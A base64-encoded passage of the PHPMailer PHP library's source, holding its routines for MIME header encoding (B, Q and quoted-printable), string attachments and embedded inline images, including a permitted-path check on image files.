KICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAvKiogQG5vaW5zcGVjdGlvbiBQaHBNaXNzaW5nQnJlYWtTdGF0ZW1lbnRJbnNwZWN0aW9uICovCiAgICAgICAgICAgIGNhc2UgJ2NvbW1lbnQnOgogICAgICAgICAgICAgICAgJG1hdGNoY291bnQgPSBwcmVnX21hdGNoX2FsbCgnL1soKSJdLycsICRzdHIsICRtYXRjaGVzKTsKICAgICAgICAgICAgICAgIC8vIEludGVudGlvbmFsIGZhbGwtdGhyb3VnaAogICAgICAgICAgICBjYXNlICd0ZXh0JzoKICAgICAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgICRtYXRjaGNvdW50ICs9IHByZWdfbWF0Y2hfYWxsKCcvW1wwMDAtXDAxMFwwMTNcMDE0XDAxNi1cMDM3XDE3Ny1cMzc3XS8nLCAkc3RyLCAkbWF0Y2hlcyk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICB9CgogICAgICAgIC8vVGhlcmUgYXJlIG5vIGNoYXJzIHRoYXQgbmVlZCBlbmNvZGluZwogICAgICAgIGlmICgkbWF0Y2hjb3VudCA9PSAwKSB7CiAgICAgICAgICAgIHJldHVybiAoJHN0cik7CiAgICAgICAgfQoKICAgICAgICAkbWF4bGVuID0gNzUgLSA3IC0gc3RybGVuKCR0aGlzLT5DaGFyU2V0KTsKICAgICAgICAvLyBUcnkgdG8gc2VsZWN0IHRoZSBlbmNvZGluZyB3aGljaCBzaG91bGQgcHJvZHVjZSB0aGUgc2hvcnRlc3Qgb3V0cHV0CiAgICAgICAgaWYgKCRtYXRjaGNvdW50ID4gc3RybGVuKCRzdHIpIC8gMykgewogICAgICAgICAgICAvLyBNb3JlIHRoYW4gYSB0aGlyZCBvZiB0aGUgY29udGVudCB3aWxsIG5lZWQgZW5jb2RpbmcsIHNvIEIgZW5jb2Rpbmcgd2lsbCBiZSBtb3N0IGVmZmljaWVudAogICAgICAgICAgICAkZW5jb2RpbmcgPSAnQic7CiAgICAgICAgICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ21iX3N0cmxlbicpICYmICR0aGlzLT5oYXNNdWx0aUJ5dGVzKCRzdHIpKSB7CiAgICAgICAgICAgICAgICAvLyBVc2UgYSBjdXN0b20gZnVuY3Rpb24gd2hpY2ggY29ycmVjdGx5IGVuY29kZXMgYW5kIHdyYXBzIGxvbmcKICAgICAgICAgICAgICAgIC8vIG11bHRpYnl0ZSBzdHJpbmdzIHdpdGhvdXQgYnJlYWtpbmcgbGluZXMgd2l0aGluIGEgY2hhcmFjdGVyCiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9ICR0aGlzLT5iYXNlNjRFbmNvZGVXcmFwTUIoJHN0ciwgIlxuIik7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9IGJhc2U2NF9lbmNvZGUoJHN0cik7CiAgICAgICAgICAgICAgICAkbWF4bGVuIC09ICRtYXhsZW4gJSA0OwogICAgICAgICAgICAgICAgJGVuY29kZWQgPSB0cmltKGNodW5rX3NwbGl0KCRlbmNvZGVkLCAkbWF4bGVuLCAiXG4iKSk7CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkZW5jb2RpbmcgPSAnUSc7CiAgICAgICAgICAgICRlbmNvZGVkID0gJHRoaXMtPmVuY29kZVEoJHN0ciwgJHBvc2l0aW9uKTsKICAgICAgICAgICAgJGVuY29kZWQgPSAkdGhpcy0+d3JhcFRleHQoJGVuY29kZWQsICRtYXhsZW4sIHRydWUpOwogICAgICAgICAgICAkZW5jb2RlZCA9IHN0cl9yZXBsYWNlKCc9JyAuIHNlbGY6OkNSTEYsICJcbiIsIHRyaW0oJGVuY29kZWQpKTsKICAgICAgICB9CgogICAgICAgICRlbmNvZGVkID0gcHJlZ19yZXBsYWNlKCcvXiguKikkL20nLCAnID0/JyAuICR0aGlzLT5DaGFyU2V0IC4gIj8kZW5jb2Rpbmc/XFwxPz0iLCAkZW5jb2RlZCk7CiAgICAgICAgJGVuY29kZWQgPSB0cmltKHN0cl9yZXBsYWNlKCJcbiIsICR0aGlzLT5MRSwgJGVuY29kZWQpKTsKCiAgICAgICAgcmV0dXJuICRlbmNvZGVkOwogICAgfQoKICAgIC8qKgogICAgICogQ2hlY2sgaWYgYSBzdHJpbmcgY29udGFpbnMgbXVsdGktYnl0ZSBjaGFyYWN0ZXJzLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0ciBtdWx0aS1ieXRlIHRleHQgdG8gd3JhcCBlbmNvZGUKICAgICAqIEByZXR1cm4gYm9vbGVhbgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gaGFzTXVsdGlCeXRlcygkc3RyKQogICAgewogICAgICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ21iX3N0cmxlbicpKSB7CiAgICAgICAgICAgIHJldHVybiAoc3RybGVuKCRzdHIpID4gbWJfc3RybGVuKCRzdHIsICR0aGlzLT5DaGFyU2V0KSk7CiAgICAgICAgfSBlbHNlIHsgLy8gQXNzdW1lIG5vIG11bHRpYnl0ZXMgKHdlIGNhbid0IGhhbmRsZSB3aXRob3V0IG1ic3RyaW5nIGZ1bmN0aW9ucyBhbnl3YXkpCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBEb2VzIGEgc3RyaW5nIGNvbnRhaW4gYW55IDgtYml0IGNoYXJzIChpbiBhbnkgY2hhcnNldCk/CiAgICAgKiBAcGFyYW0gc3RyaW5nICR0ZXh0CiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGhhczhiaXRDaGFycygkdGV4dCkKICAgIHsKICAgICAgICByZXR1cm4gKGJvb2xlYW4pcHJlZ19tYXRjaCgnL1tceDgwLVx4RkZdLycsICR0ZXh0KTsKICAgIH0KCiAgICAvKioKICAgICAqIEVuY29kZSBhbmQgd3JhcCBsb25nIG11bHRpYnl0ZSBzdHJpbmdzIGZvciBtYWlsIGhlYWRlcnMKICAgICAqIHdpdGhvdXQgYnJlYWtpbmcgbGluZXMgd2l0aGluIGEgY2hhcmFjdGVyLgogICAgICogQWRhcHRlZCBmcm9tIGEgZnVuY3Rpb24gYnkgcGFyYXZvaWQKICAgICAqIEBsaW5rIGh0dHA6Ly93d3cucGhwLm5ldC9tYW51YWwvZW4vZnVuY3Rpb24ubWItZW5jb2RlLW1pbWVoZWFkZXIucGhwIzYwMjgzCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkc3RyIG11bHRpLWJ5dGUgdGV4dCB0byB3cmFwIGVuY29kZQogICAgICogQHBhcmFtIHN0cmluZyAkbGluZWJyZWFrIHN0cmluZyB0byB1c2UgYXMgbGluZWZlZWQvZW5kLW9mLWxpbmUKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBiYXNlNjRFbmNvZGVXcmFwTUIoJHN0ciwgJGxpbmVicmVhayA9IG51bGwpCiAgICB7CiAgICAgICAgJHN0YXJ0ID0gJz0/JyAuICR0aGlzLT5DaGFyU2V0IC4gJz9CPyc7CiAgICAgICAgJGVuZCA9ICc/PSc7CiAgICAgICAgJGVuY29kZWQgPSAnJzsKICAgICAgICBpZiAoJGxpbmVicmVhayA9PT0gbnVsbCkgewogICAgICAgICAgICAkbGluZWJyZWFrID0gJHRoaXMtPkxFOwogICAgICAgIH0KCiAgICAgICAgJG1iX2xlbmd0aCA9IG1iX3N0cmxlbigkc3RyLCAkdGhpcy0+Q2hhclNldCk7CiAgICAgICAgLy8gRWFjaCBsaW5lIG11c3QgaGF2ZSBsZW5ndGggPD0gNzUsIGluY2x1ZGluZyAkc3RhcnQgYW5kICRlbmQKICAgICAgICAkbGVuZ3RoID0gNzUgLSBzdHJsZW4oJHN0YXJ0KSAtIHN0cmxlbigkZW5kKTsKICAgICAgICAvLyBBdmVyYWdlIG11bHRpLWJ5dGUgcmF0aW8KICAgICAgICAkcmF0aW8gPSAkbWJfbGVuZ3RoIC8gc3RybGVuKCRzdHIpOwogICAgICAgIC8vIEJhc2U2NCBoYXMgYSA0OjMgcmF0aW8KICAgICAgICAkYXZnTGVuZ3RoID0gZmxvb3IoJGxlbmd0aCAqICRyYXRpbyAqIC43NSk7CgogICAgICAgIGZvciAoJGkgPSAwOyAkaSA8ICRtYl9sZW5ndGg7ICRpICs9ICRvZmZzZXQpIHsKICAgICAgICAgICAgJGxvb2tCYWNrID0gMDsKICAgICAgICAgICAgZG8gewogICAgICAgICAgICAgICAgJG9mZnNldCA9ICRhdmdMZW5ndGggLSAkbG9va0JhY2s7CiAgICAgICAgICAgICAgICAkY2h1bmsgPSBtYl9zdWJzdHIoJHN0ciwgJGksICRvZmZzZXQsICR0aGlzLT5DaGFyU2V0KTsKICAgICAgICAgICAgICAgICRjaHVuayA9IGJhc2U2NF9lbmNvZGUoJGNodW5rKTsKICAgICAgICAgICAgICAgICRsb29rQmFjaysrOwogICAgICAgICAgICB9IHdoaWxlIChzdHJsZW4oJGNodW5rKSA+ICRsZW5ndGgpOwogICAgICAgICAgICAkZW5jb2RlZCAuPSAkY2h1bmsgLiAkbGluZWJyZWFrOwogICAgICAgIH0KCiAgICAgICAgLy8gQ2hvbXAgdGhlIGxhc3QgbGluZWZlZWQKICAgICAgICAkZW5jb2RlZCA9IHN1YnN0cigkZW5jb2RlZCwgMCwgLXN0cmxlbigkbGluZWJyZWFrKSk7CiAgICAgICAgcmV0dXJuICRlbmNvZGVkOwogICAgfQoKICAgIC8qKgogICAgICogRW5jb2RlIGEgc3RyaW5nIGluIHF1b3RlZC1wcmludGFibGUgZm9ybWF0LgogICAgICogQWNjb3JkaW5nIHRvIFJGQzIwNDUgc2VjdGlvbiA2LjcuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkc3RyaW5nIFRoZSB0ZXh0IHRvIGVuY29kZQogICAgICogQHBhcmFtIGludGVnZXIgJGxpbmVfbWF4IE51bWJlciBvZiBjaGFycyBhbGxvd2VkIG9uIGEgbGluZSBiZWZvcmUgd3JhcHBpbmcKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKiBAbGluayBodHRwOi8vd3d3LnBocC5uZXQvbWFudWFsL2VuL2Z1bmN0aW9uLnF1b3RlZC1wcmludGFibGUtZGVjb2RlLnBocCM4OTQxNyBBZGFwdGVkIGZyb20gdGhpcyBjb21tZW50CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBlbmNvZGVRUCgkc3RyaW5nLCAkbGluZV9tYXggPSA3NikKICAgIHsKICAgICAgICAvLyBVc2UgbmF0aXZlIGZ1bmN0aW9uIGlmIGl0J3MgYXZhaWxhYmxlICg+PSBQSFA1LjMpCiAgICAgICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygncXVvdGVkX3ByaW50YWJsZV9lbmNvZGUnKSkgewogICAgICAgICAgICByZXR1cm4gcXVvdGVkX3ByaW50YWJsZV9lbmNvZGUoJHN0cmluZyk7CiAgICAgICAgfQogICAgICAgIC8vIEZhbGwgYmFjayB0byBhIHB1cmUgUEhQIGltcGxlbWVudGF0aW9uCiAgICAgICAgJHN0cmluZyA9IHN0cl9yZXBsYWNlKAogICAgICAgICAgICBhcnJheSgnJTIwJywgJyUwRCUwQS4nLCAnJTBEJTBBJywgJyUnKSwKICAgICAgICAgICAgYXJyYXkoJyAnLCAiXHJcbj0yRSIsICJcclxuIiwgJz0nKSwKICAgICAgICAgICAgcmF3dXJsZW5jb2RlKCRzdHJpbmcpCiAgICAgICAgKTsKICAgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvW15cclxuXXsnIC4gKCRsaW5lX21heCAtIDMpIC4gJ31bXj1cclxuXXsyfS8nLCAiJDA9XHJcbiIsICRzdHJpbmcpOwogICAgfQoKICAgIC8qKgogICAgICogQmFja3dhcmQgY29tcGF0aWJpbGl0eSB3cmFwcGVyIGZvciBhbiBvbGQgUVAgZW5jb2RpbmcgZnVuY3Rpb24gdGhhdCB3YXMgcmVtb3ZlZC4KICAgICAqIEBzZWUgUEhQTWFpbGVyOjplbmNvZGVRUCgpCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkc3RyaW5nCiAgICAgKiBAcGFyYW0gaW50ZWdlciAkbGluZV9tYXgKICAgICAqIEBwYXJhbSBib29sZWFuICRzcGFjZV9jb252CiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICogQGRlcHJlY2F0ZWQgVXNlIGVuY29kZVFQIGluc3RlYWQuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBlbmNvZGVRUHBocCgKICAgICAgICAkc3RyaW5nLAogICAgICAgICRsaW5lX21heCA9IDc2LAogICAgICAgIC8qKiBAbm9pbnNwZWN0aW9uIFBocFVudXNlZFBhcmFtZXRlckluc3BlY3Rpb24gKi8gJHNwYWNlX2NvbnYgPSBmYWxzZQogICAgKSB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5lbmNvZGVRUCgkc3RyaW5nLCAkbGluZV9tYXgpOwogICAgfQoKICAgIC8qKgogICAgICogRW5jb2RlIGEgc3RyaW5nIHVzaW5nIFEgZW5jb2RpbmcuCiAgICAgKiBAbGluayBodHRwOi8vdG9vbHMuaWV0Zi5vcmcvaHRtbC9yZmMyMDQ3CiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHIgdGhlIHRleHQgdG8gZW5jb2RlCiAgICAgKiBAcGFyYW0gc3RyaW5nICRwb3NpdGlvbiBXaGVyZSB0aGUgdGV4dCBpcyBnb2luZyB0byBiZSB1c2VkLCBzZWUgdGhlIFJGQyBmb3Igd2hhdCB0aGF0IG1lYW5zCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGVuY29kZVEoJHN0ciwgJHBvc2l0aW9uID0gJ3RleHQnKQogICAgewogICAgICAgIC8vIFRoZXJlIHNob3VsZCBub3QgYmUgYW55IEVPTCBpbiB0aGUgc3RyaW5nCiAgICAgICAgJHBhdHRlcm4gPSAnJzsKICAgICAgICAkZW5jb2RlZCA9IHN0cl9yZXBsYWNlKGFycmF5KCJcciIsICJcbiIpLCAnJywgJHN0cik7CiAgICAgICAgc3dpdGNoIChzdHJ0b2xvd2VyKCRwb3NpdGlvbikpIHsKICAgICAgICAgICAgY2FzZSAncGhyYXNlJzoKICAgICAgICAgICAgICAgIC8vIFJGQyAyMDQ3IHNlY3Rpb24gNS4zCiAgICAgICAgICAgICAgICAkcGF0dGVybiA9ICdeQS1aYS16MC05ISorXC8gLSc7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgLyoqIEBub2luc3BlY3Rpb24gUGhwTWlzc2luZ0JyZWFrU3RhdGVtZW50SW5zcGVjdGlvbiAqLwogICAgICAgICAgICBjYXNlICdjb21tZW50JzoKICAgICAgICAgICAgICAgIC8vIFJGQyAyMDQ3IHNlY3Rpb24gNS4yCiAgICAgICAgICAgICAgICAkcGF0dGVybiA9ICdcKFwpIic7CiAgICAgICAgICAgICAgICAvLyBpbnRlbnRpb25hbCBmYWxsLXRocm91Z2gKICAgICAgICAgICAgICAgIC8vIGZvciB0aGlzIHJlYXNvbiB3ZSBidWlsZCB0aGUgJHBhdHRlcm4gd2l0aG91dCBpbmNsdWRpbmcgZGVsaW1pdGVycyBhbmQgW10KICAgICAgICAgICAgY2FzZSAndGV4dCc6CiAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICAvLyBSRkMgMjA0NyBzZWN0aW9uIDUuMQogICAgICAgICAgICAgICAgLy8gUmVwbGFjZSBldmVyeSBoaWdoIGFzY2lpLCBjb250cm9sLCA9LCA/IGFuZCBfIGNoYXJhY3RlcnMKICAgICAgICAgICAgICAgICRwYXR0ZXJuID0gJ1wwMDAtXDAxMVwwMTNcMDE0XDAxNi1cMDM3XDA3NVwwNzdcMTM3XDE3Ny1cMzc3JyAuICRwYXR0ZXJuOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQogICAgICAgICRtYXRjaGVzID0gYXJyYXkoKTsKICAgICAgICBpZiAocHJlZ19tYXRjaF9hbGwoIi9beyRwYXR0ZXJufV0vIiwgJGVuY29kZWQsICRtYXRjaGVzKSkgewogICAgICAgICAgICAvLyBJZiB0aGUgc3RyaW5nIGNvbnRhaW5zIGFuICc9JywgbWFrZSBzdXJlIGl0J3MgdGhlIGZpcnN0IHRoaW5nIHdlIHJlcGxhY2UKICAgICAgICAgICAgLy8gc28gYXMgdG8gYXZvaWQgZG91YmxlLWVuY29kaW5nCiAgICAgICAgICAgICRlcWtleSA9IGFycmF5X3NlYXJjaCgnPScsICRtYXRjaGVzWzBdKTsKICAgICAgICAgICAgaWYgKGZhbHNlICE9PSAkZXFrZXkpIHsKICAgICAgICAgICAgICAgIHVuc2V0KCRtYXRjaGVzWzBdWyRlcWtleV0pOwogICAgICAgICAgICAgICAgYXJyYXlfdW5zaGlmdCgkbWF0Y2hlc1swXSwgJz0nKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBmb3JlYWNoIChhcnJheV91bmlxdWUoJG1hdGNoZXNbMF0pIGFzICRjaGFyKSB7CiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9IHN0cl9yZXBsYWNlKCRjaGFyLCAnPScgLiBzcHJpbnRmKCclMDJYJywgb3JkKCRjaGFyKSksICRlbmNvZGVkKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAvLyBSZXBsYWNlIGV2ZXJ5IHNwYWNlcyB0byBfIChtb3JlIHJlYWRhYmxlIHRoYW4gPTIwKQogICAgICAgIHJldHVybiBzdHJfcmVwbGFjZSgnICcsICdfJywgJGVuY29kZWQpOwogICAgfQoKICAgIC8qKgogICAgICogQWRkIGEgc3RyaW5nIG9yIGJpbmFyeSBhdHRhY2htZW50IChub24tZmlsZXN5c3RlbSkuCiAgICAgKiBUaGlzIG1ldGhvZCBjYW4gYmUgdXNlZCB0byBhdHRhY2ggYXNjaWkgb3IgYmluYXJ5IGRhdGEsCiAgICAgKiBzdWNoIGFzIGEgQkxPQiByZWNvcmQgZnJvbSBhIGRhdGFiYXNlLgogICAgICogQHBhcmFtIHN0cmluZyAkc3RyaW5nIFN0cmluZyBhdHRhY2htZW50IGRhdGEuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRmaWxlbmFtZSBOYW1lIG9mIHRoZSBhdHRhY2htZW50LgogICAgICogQHBhcmFtIHN0cmluZyAkZW5jb2RpbmcgRmlsZSBlbmNvZGluZyAoc2VlICRFbmNvZGluZykuCiAgICAgKiBAcGFyYW0gc3RyaW5nICR0eXBlIEZpbGUgZXh0ZW5zaW9uIChNSU1FKSB0eXBlLgogICAgICogQHBhcmFtIHN0cmluZyAkZGlzcG9zaXRpb24gRGlzcG9zaXRpb24gdG8gdXNlCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGFkZFN0cmluZ0F0dGFjaG1lbnQoCiAgICAgICAgJHN0cmluZywKICAgICAgICAkZmlsZW5hbWUsCiAgICAgICAgJGVuY29kaW5nID0gJ2Jhc2U2NCcsCiAgICAgICAgJHR5cGUgPSAnJywKICAgICAgICAkZGlzcG9zaXRpb24gPSAnYXR0YWNobWVudCcKICAgICkgewogICAgICAgIC8vIElmIGEgTUlNRSB0eXBlIGlzIG5vdCBzcGVjaWZpZWQsIHRyeSB0byB3b3JrIGl0IG91dCBmcm9tIHRoZSBmaWxlIG5hbWUKICAgICAgICBpZiAoJHR5cGUgPT0gJycpIHsKICAgICAgICAgICAgJHR5cGUgPSBzZWxmOjpmaWxlbmFtZVRvVHlwZSgkZmlsZW5hbWUpOwogICAgICAgIH0KICAgICAgICAvLyBBcHBlbmQgdG8gJGF0dGFjaG1lbnQgYXJyYXkKICAgICAgICAkdGhpcy0+YXR0YWNobWVudFtdID0gYXJyYXkoCiAgICAgICAgICAgIDAgPT4gJHN0cmluZywKICAgICAgICAgICAgMSA9PiAkZmlsZW5hbWUsCiAgICAgICAgICAgIDIgPT4gYmFzZW5hbWUoJGZpbGVuYW1lKSwKICAgICAgICAgICAgMyA9PiAkZW5jb2RpbmcsCiAgICAgICAgICAgIDQgPT4gJHR5cGUsCiAgICAgICAgICAgIDUgPT4gdHJ1ZSwgLy8gaXNTdHJpbmdBdHRhY2htZW50CiAgICAgICAgICAgIDYgPT4gJGRpc3Bvc2l0aW9uLAogICAgICAgICAgICA3ID0+IDAKICAgICAgICApOwogICAgfQoKICAgIC8qKgogICAgICogQWRkIGFuIGVtYmVkZGVkIChpbmxpbmUpIGF0dGFjaG1lbnQgZnJvbSBhIGZpbGUuCiAgICAgKiBUaGlzIGNhbiBpbmNsdWRlIGltYWdlcywgc291bmRzLCBhbmQganVzdCBhYm91dCBhbnkgb3RoZXIgZG9jdW1lbnQgdHlwZS4KICAgICAqIFRoZXNlIGRpZmZlciBmcm9tICdyZWd1bGFyJyBhdHRhY2htZW50cyBpbiB0aGF0IHRoZXkgYXJlIGludGVuZGVkIHRvIGJlCiAgICAgKiBkaXNwbGF5ZWQgaW5saW5lIHdpdGggdGhlIG1lc3NhZ2UsIG5vdCBqdXN0IGF0dGFjaGVkIGZvciBkb3dubG9hZC4KICAgICAqIFRoaXMgaXMgdXNlZCBpbiBIVE1MIG1lc3NhZ2VzIHRoYXQgZW1iZWQgdGhlIGltYWdlcwogICAgICogdGhlIEhUTUwgcmVmZXJzIHRvIHVzaW5nIHRoZSAkY2lkIHZhbHVlLgogICAgICogTmV2ZXIgdXNlIGEgdXNlci1zdXBwbGllZCBwYXRoIHRvIGEgZmlsZSEKICAgICAqIEBwYXJhbSBzdHJpbmcgJHBhdGggUGF0aCB0byB0aGUgYXR0YWNobWVudC4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGNpZCBDb250ZW50IElEIG9mIHRoZSBhdHRhY2htZW50OyBVc2UgdGhpcyB0byByZWZlcmVuY2UKICAgICAqICAgICAgICB0aGUgY29udGVudCB3aGVuIHVzaW5nIGFuIGVtYmVkZGVkIGltYWdlIGluIEhUTUwuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lIE92ZXJyaWRlcyB0aGUgYXR0YWNobWVudCBuYW1lLgogICAgICogQHBhcmFtIHN0cmluZyAkZW5jb2RpbmcgRmlsZSBlbmNvZGluZyAoc2VlICRFbmNvZGluZykuCiAgICAgKiBAcGFyYW0gc3RyaW5nICR0eXBlIEZpbGUgTUlNRSB0eXBlLgogICAgICogQHBhcmFtIHN0cmluZyAkZGlzcG9zaXRpb24gRGlzcG9zaXRpb24gdG8gdXNlCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4gVHJ1ZSBvbiBzdWNjZXNzZnVsbHkgYWRkaW5nIGFuIGF0dGFjaG1lbnQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGFkZEVtYmVkZGVkSW1hZ2UoJHBhdGgsICRjaWQsICRuYW1lID0gJycsICRlbmNvZGluZyA9ICdiYXNlNjQnLCAkdHlwZSA9ICcnLCAkZGlzcG9zaXRpb24gPSAnaW5saW5lJykKICAgIHsKICAgICAgICBpZiAoIXNlbGY6OmlzUGVybWl0dGVkUGF0aCgkcGF0aCkgb3IgIUBpc19maWxlKCRwYXRoKSkgewogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJHRoaXMtPmxhbmcoJ2ZpbGVfYWNjZXNzJykgLiAkcGF0aCk7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CgogICAgICAgIC8vIElmIGEgTUlNRSB0eXBlIGlzIG5vdCBzcGVjaWZpZWQsIHRyeSB0byB3b3JrIGl0IG91dCBmcm9tIHRoZSBmaWxlIG5hbWUKICAgICAgICBpZiAoJHR5cGUgPT0gJycpIHsKICAgICAgICAgICAgJHR5cGUgPSBzZWxmOjpmaWxlbmFtZVRvVHlwZSgkcGF0aCk7CiAgICAgICAgfQoKICAgICAgICAkZmlsZW5hbWUgPSBiYXNlbmFtZSgkcGF0aCk7CiAgICAgICAgaWYgKCRuYW1lID09ICcnKSB7CiAgICAgICAgICAgICRuYW1lID0gJGZpbGVuYW1lOwogICAgICAgIH0KCiAgICAgICAgLy8gQXBwZW5kIHRvICRhdHRhY2htZW50IGFycmF5CiAgICAgICAgJHRoaXMtPmF0dGFjaG1lbnRbXSA9IGFycmF5KAogICAgICAgICAgICAwID0+ICRwYXRoLAogICAgICAgICAgICAxID0+ICRmaWxlbmFtZSwKICAgICAgICAgICAgMiA9PiAkbmFtZSwKICAgICAgICAgICAgMyA9PiAkZW5jb2RpbmcsCiAgICAgICAgICAgIDQgPT4gJHR5cGUsCiAgICAgICAgICAgIDUgPT4gZmFsc2UsIC8vIGlzU3RyaW5nQXR0YWNobWVudAogICAgICAgICAgICA2ID0+ICRkaXNwb3NpdGlvbiwKICAgICAgICAgICAgNyA9PiAkY2lkCiAgICAgICAgKTsKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICAvKioKICAgICAqIEFkZCBhbiBlbWJlZGRlZCBzdHJpbmdpZmllZCBhdHRhY2htZW50LgogICAgICogVGhpcyBjYW4gaW5jbHVkZSBpbWFnZXMsIHNvdW5kcywgYW5kIGp1c3QgYWJvdXQgYW55IG90aGVyIGRvY3VtZW50IHR5cGUuCiAgICAgKiBCZSBzdXJlIHRvIHNldCB0aGUgJHR5cGUgdG8gYW4gaW1hZ2UgdHlwZSBmb3IgaW1hZ2VzOgogICAgICogSlBFRyBpbWFnZXMgdXNlICdpbWFnZS9qcGVnJywgR0lGIHVzZXMgJ2ltYWdlL2dpZicsIFBORyB1c2VzICdpbWFnZS9wbmcnLgogICAgICogQHBhcmFtIHN0cmluZyAkc3RyaW5nIFRoZSBhdHRhY2htZW50IGJpbmFyeSBkYXRhLgogICAgICogQHBhcmFtIHN0cmluZyAkY2lkIENvbnRlbnQgSUQgb2YgdGhlIGF0dGFjaG1lbnQ7IFVzZSB0aGlzIHRvIHJlZmVyZW5jZQogICAgICogICAgICAgIHRoZSBjb250ZW50IHdoZW4gdXNpbmcgYW4gZW1iZWRkZWQgaW1hZ2UgaW4gSFRNTC4KICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUKICAgICAqIEBwYXJhbSBzdHJpbmcgJGVuY29kaW5nIEZpbGUgZW5jb2RpbmcgKHNlZSAkRW5jb2RpbmcpLgogICAgICogQHBhcmFtIHN0cmluZyAkdHlwZSBNSU1FIHR5cGUuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRkaXNwb3NpdGlvbiBEaXNwb3NpdGlvbiB0byB1c2UKICAgICAqIEByZXR1cm4gYm9vbGVhbiBUcnVlIG9uIHN1Y2Nlc3NmdWxseSBhZGRpbmcgYW4gYXR0YWNobWVudAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkU3RyaW5nRW1iZWRkZWRJbWFnZSgKICAgICAgICAkc3RyaW5nLAogICAgICAgICRjaWQsCiAgICAgICAgJG5hbWUgPSAnJywKICAgICAgICAkZW5jb2RpbmcgPSAnYmFzZTY0JywKICAgICAgICAkdHlwZSA9ICcnLAogICAgICAgICRkaXNwb3NpdGlvbiA9ICdpbmxpbmUnCiAgICApIHsKICAgICAgICAvLyBJZiBhIE1JTUUgdHlwZSBpcyBub3Qgc3BlY2lmaWVkLCB0cnkgdG8gd29yayBpdCBvdXQgZnJvbSB0aGUgbmFtZQogICAgICAgIGlmICgkdHlwZSA9PSAnJyBhbmQgIWVtcHR5KCRuYW1lKSkgewogICAgICAgICAgICAkdHlwZSA9IHNlbGY6OmZpbGVuYW1lVG9UeXBlKCRuYW1lKTsKICAgICAgICB9CgogICAgICAgIC8vIEFwcGVuZCB0byAkYXR0YWNobWVudCBhcnJheQogICAgICAgICR0aGlzLT5hdHRhY2htZW50W10gPSBhcnJheSgKICAgICAgICAgICAgMCA9PiAkc3RyaW5nLAogICAgICAgICAgICAxID0+ICRuYW1lLAogICAgICAgICAgICAyID0+ICRuYW1lLAogICAgICAgICAgICAzID0+ICRlbmNvZGluZywKICAgICAgICAgICAgNCA9PiAkdHlwZSwKICAgICAgICAgICAgNSA9PiB0cnVlLCAvLyBpc1N0cmluZ0F0dGFjaG1lbnQKICAgICAgICAgICAgNiA9PiAkZGlzcG9zaXRpb24sCiAgICAgICAgICAgIDcgPT4gJGNpZAogICAgICAgICk7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgLyoqCiAgICAgKiBDaGVjayBpZiBhbiBpbmxpbmUgYXR0YWNobWVudCBpcyBwcmVzZW50LgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEByZXR1cm4gYm9vbGVhbgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gaW5saW5lSW1hZ2VFeGlzdHMoKQogICAgewogICAgICAgIGZvcmVhY2ggKCR0aGlzLT5hdHRhY2htZW50IGFzICRhdHRhY2htZW50KSB7CiAgICAgICAgICAgIGlmICgkYXR0YWNobWVudFs2XSA9PSAnaW5saW5lJykgewogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIC8qKgogIC